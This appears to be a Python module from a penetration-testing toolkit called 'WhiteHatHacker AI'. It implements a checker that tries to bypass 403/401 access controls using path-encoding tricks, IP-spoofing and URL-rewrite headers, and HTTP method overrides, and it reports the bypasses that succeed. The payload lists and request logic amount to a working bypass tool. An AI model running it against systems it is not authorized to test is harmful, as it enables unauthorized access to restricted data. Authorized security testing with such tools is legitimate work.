"""
WhiteHatHacker AI — 403/401 Bypass Engine (V7-T2-4)

Erişim kısıtlamalı (403 Forbidden / 401 Unauthorized) endpoint'ler
için 30+ bypass tekniği dener:
  - Path manipulation (..;/, %2e, double URL encoding)
  - HTTP method override (X-HTTP-Method-Override, X-Method-Override)
  - Header injection (X-Forwarded-For, X-Original-URL, X-Rewrite-URL)
  - HTTP version downgrade
  - Case change / path normalization tricks
"""

from __future__ import annotations

from typing import Any
from urllib.parse import urlparse

import httpx
from loguru import logger

from src.tools.base import Finding, SecurityTool, ToolResult
from src.utils.constants import RiskLevel, ScanProfile, SeverityLevel, ToolCategory
from src.utils.response_validator import ResponseValidator


_response_validator = ResponseValidator()

_ERROR_BODY_TOKENS = (
    "unauthorized",
    "forbidden",
    "access denied",
    "permission denied",
    "authentication required",
    "method not allowed",
    "not supported",
    "request blocked",
    "captcha",
    "cloudflare",
    "ray id:",
    "login",
    "sign in",
)

_RESOURCE_BODY_TOKENS = (
    "dashboard",
    "admin",
    "settings",
    "profile",
    "user",
    "account",
    "api",
    "token",
    "data",
    "table",
)


def _has_error_body(body: str) -> bool:
    body_lower = (body or "")[:5000].lower()
    return any(token in body_lower for token in _ERROR_BODY_TOKENS)


def _has_resource_signal(body: str, original_url: str) -> bool:
    body_lower = (body or "")[:5000].lower()
    url_bits = [part for part in urlparse(original_url).path.lower().split("/") if len(part) > 2]
    return any(token in body_lower for token in _RESOURCE_BODY_TOKENS) or any(bit in body_lower for bit in url_bits)


# ============================================================
# Bypass Techniques
# ============================================================

def _path_mutations(path: str) -> list[dict[str, Any]]:
    """Generate path-based bypass mutations."""
    mutations: list[dict[str, Any]] = []
    clean = path.rstrip("/")

    # Trailing slash / double slash
    mutations.append({"path": clean + "/", "technique": "trailing_slash"})
    mutations.append({"path": clean + "//", "technique": "double_slash"})
    mutations.append({"path": "/" + clean.lstrip("/"), "technique": "leading_slash"})

    # URL encoding tricks
    mutations.append({"path": clean + "%20", "technique": "url_encoded_space"})
    mutations.append({"path": clean + "%09", "technique": "url_encoded_tab"})
    mutations.append({"path": clean + "?", "technique": "trailing_question"})
    mutations.append({"path": clean + "??", "technique": "double_question"})
    mutations.append({"path": clean + "#", "technique": "trailing_hash"})
    mutations.append({"path": clean + ";", "technique": "trailing_semicolon"})
    mutations.append({"path": clean + "/.", "technique": "trailing_dot"})
    mutations.append({"path": clean + "/..", "technique": "trailing_dotdot"})
    mutations.append({"path": clean + "/..;/", "technique": "dotdot_semicolon"})

    # Path traversal bypass (spring / tomcat)
    mutations.append({"path": clean + "..;/", "technique": "spring_bypass"})
    mutations.append({"path": clean.replace("/", "//"), "technique": "double_slashes"})

    # Case manipulation
    parts = clean.split("/")
    if len(parts) > 1:
        last = parts[-1]
        mutations.append(
            {"path": "/".join(parts[:-1]) + "/" + last.upper(), "technique": "uppercase_last"}
        )
        mutations.append(
            {"path": "/".join(parts[:-1]) + "/" + last.capitalize(), "technique": "capitalize_last"}
        )

    # URL encoded slashes
    mutations.append({"path": clean.replace("/", "%2f"), "technique": "encoded_slash"})
    mutations.append({"path": clean.replace("/", "%252f"), "technique": "double_encoded_slash"})

    # Dot segments
    mutations.append({"path": f"/{clean.lstrip('/')}/./", "technique": "dot_segment"})

    return mutations


def _header_bypasses() -> list[dict[str, dict[str, str]]]:
    """Generate header-based bypass techniques."""
    bypass_headers: list[dict[str, dict[str, str]]] = []

    # IP spoof headers
    for ip in ("127.0.0.1", "localhost", "10.0.0.1", "0.0.0.0"):
        for hdr in (
            "X-Forwarded-For",
            "X-Real-IP",
            "X-Originating-IP",
            "X-Client-IP",
            "X-Remote-IP",
            "X-Remote-Addr",
            "True-Client-IP",
            "Client-IP",
        ):
            bypass_headers.append({
                "headers": {hdr: ip},
                "technique": f"{hdr}:{ip}",
            })

    # Forwarded host / URL rewrite
    bypass_headers.append({
        "headers": {"X-Original-URL": "/"},
        "technique": "X-Original-URL:/",
    })
    bypass_headers.append({
        "headers": {"X-Rewrite-URL": "/"},
        "technique": "X-Rewrite-URL:/",
    })
    bypass_headers.append({
        "headers": {"X-Custom-IP-Authorization": "127.0.0.1"},
        "technique": "X-Custom-IP-Authorization",
    })
    bypass_headers.append({
        "headers": {"X-Forwarded-Host": "localhost"},
        "technique": "X-Forwarded-Host:localhost",
    })
    bypass_headers.append({
        "headers": {"X-Host": "localhost"},
        "technique": "X-Host:localhost",
    })

    return bypass_headers


def _method_overrides() -> list[dict[str, Any]]:
    """HTTP method override techniques."""
    return [
        {"method": "GET", "headers": {"X-HTTP-Method-Override": "GET"}, "technique": "X-HTTP-Method-Override:GET"},
        {"method": "POST", "headers": {"X-HTTP-Method": "GET"}, "technique": "X-HTTP-Method:GET"},
        {"method": "GET", "headers": {"X-Method-Override": "GET"}, "technique": "X-Method-Override:GET"},
        {"method": "TRACE", "headers": {}, "technique": "TRACE_method"},
        {"method": "OPTIONS", "headers": {}, "technique": "OPTIONS_method"},
        {"method": "PATCH", "headers": {}, "technique": "PATCH_method"},
    ]


# ============================================================
# Checker
# ============================================================


class FourXXBypassChecker(SecurityTool):
    """
    Tests 403/401 forbidden endpoints for access control bypasses
    using path manipulation, header injection, and method overrides.
    """

    name = "fourxx_bypass"
    category = ToolCategory.SCANNER
    description = "403/401 Forbidden bypass tester (30+ techniques)"
    binary_name = ""
    requires_root = False
    risk_level = RiskLevel.LOW

    def is_available(self) -> bool:
        return True

    async def run(
        self,
        target: str,
        options: dict[str, Any] | None = None,
        profile: ScanProfile = ScanProfile.BALANCED,
    ) -> ToolResult:
        options = options or {}
        endpoints: list[str] = options.get("endpoints", [])
        if not endpoints:
            endpoints = [target]

        all_findings: list[Finding] = []

        max_techniques = {"stealth": 10, "balanced": 25, "aggressive": 50}.get(
            str(profile), 25,
        )

        async with httpx.AsyncClient(
            timeout=10.0,
            follow_redirects=False,
            verify=False,
            limits=httpx.Limits(max_connections=5),
        ) as client:
            for ep in endpoints:
                findings = await self._test_endpoint(client, ep, max_techniques)
                all_findings.extend(findings)

        return ToolResult(
            tool_name=self.name,
            success=True,
            findings=all_findings,
            raw_output=f"Tested {len(endpoints)} endpoints, found {len(all_findings)} bypasses",
        )

    async def _test_endpoint(
        self,
        client: httpx.AsyncClient,
        url: str,
        max_techniques: int,
    ) -> list[Finding]:
        findings: list[Finding] = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"

        # First, confirm this endpoint is actually blocked
        try:
            baseline = await client.get(url)
            if baseline.status_code not in (401, 403):
                return []  # Not blocked, skip
            baseline_status = baseline.status_code
            baseline_len = len(baseline.content)
            baseline_body = baseline.text
        except httpx.HTTPError:
            return []

        techniques_tried = 0

        # Phase 1: Path mutations
        for mutation in _path_mutations(path):
            if techniques_tried >= max_techniques:
                break
            techniques_tried += 1
            test_url = base + mutation["path"]
            finding = await self._try_bypass(
                client, test_url, "GET", {}, mutation["technique"],
                baseline_status, baseline_len, baseline_body, url,
            )
            if finding:
                findings.append(finding)

        # Phase 2: Header bypasses
        for hdrby in _header_bypasses():
            if techniques_tried >= max_techniques:
                break
            techniques_tried += 1
            finding = await self._try_bypass(
                client, url, "GET", hdrby["headers"], hdrby["technique"],
                baseline_status, baseline_len, baseline_body, url,
            )
            if finding:
                findings.append(finding)

        # Phase 3: Method overrides
        for mo in _method_overrides():
            if techniques_tried >= max_techniques:
                break
            techniques_tried += 1
            finding = await self._try_bypass(
                client, url, mo["method"], mo.get("headers", {}),
                mo["technique"], baseline_status, baseline_len, baseline_body, url,
            )
            if finding:
                findings.append(finding)

        return findings

    async def _try_bypass(
        self,
        client: httpx.AsyncClient,
        url: str,
        method: str,
        headers: dict[str, str],
        technique: str,
        baseline_status: int,
        baseline_len: int,
        baseline_body: str,
        original_url: str,
    ) -> Finding | None:
        try:
            resp = await client.request(method, url, headers=headers)

            # Bypass detected: originally blocked, now accessible
            if resp.status_code == 200 and baseline_status in (401, 403):
                # Sanity: make sure it's not a generic error page
                body_len = len(resp.content)
                body_text = resp.text
                validation = _response_validator.validate_for_checker(
                    resp.status_code,
                    dict(resp.headers),
                    body_text,
                    checker_name="fourxx_bypass",
                    expected_content_type="text",
                    baseline_body=baseline_body,
                    url=url,
                )
                if not validation.is_valid:
                    return None
                if body_len > 0 and abs(body_len - baseline_len) > 50 and not _has_error_body(body_text) and _has_resource_signal(body_text, original_url):
                    return Finding(
                        title=f"403/401 Bypass via {technique}",
                        description=(
                            f"The restricted endpoint '{original_url}' (HTTP {baseline_status}) "
                            f"was successfully bypassed using technique '{technique}'. "
                            f"The server returned HTTP {resp.status_code} with "
                            f"{body_len} bytes (vs {baseline_len} bytes for blocked response)."
                        ),
                        vulnerability_type="broken_access_control",
                        severity=SeverityLevel.HIGH,
                        confidence=75.0,
                        target=original_url,
                        endpoint=url,
                        parameter=technique,
                        evidence=(
                            f"Technique: {technique}\n"
                            f"Method: {method}\n"
                            f"Headers: {headers}\n"
                            f"URL: {url}\n"
                            f"Baseline: {baseline_status} ({baseline_len}B)\n"
                            f"Bypass: {resp.status_code} ({body_len}B)"
                        ),
                        tool_name=self.name,
                        tags=["access-control", "bypass", technique],
                    )
        except httpx.HTTPError:
            logger.debug("fourxx bypass request failed")
        return None

    def parse_output(self, raw_output: str, target: str = "") -> list[Finding]:
        return []

    def build_command(self, target: str, options=None, profile=None) -> list[str]:
        return []  # No external binary

    def get_default_options(self, profile: ScanProfile) -> dict[str, Any]:
        return {}
